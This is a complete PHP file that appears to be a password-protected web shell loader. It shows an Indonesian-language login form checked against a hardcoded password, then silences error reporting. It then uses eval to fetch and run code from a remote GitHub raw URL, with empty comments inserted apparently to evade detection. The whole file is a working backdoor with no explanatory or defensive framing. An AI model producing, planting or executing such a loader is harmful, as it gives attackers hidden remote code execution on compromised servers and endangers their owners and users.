<?php
session_start();

$password = "BAHT123";

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $password) {
            $_SESSION['authenticated'] = true;
        } else {
            die("Password salah!");
        }
    } else {
        echo '<form method="POST">
                <input type="password" name="password" placeholder="Masukkan user">
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}

error_reporting(0);
ini_set('display_errors', 0); ?>
<?php eval(
    /**_**/ urldecode("%3f%3e") .
        file_get_contents(
            /**_**/ urldecode(
                /**_**/ "https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/scanners.php"
            )
        )
); ?> 
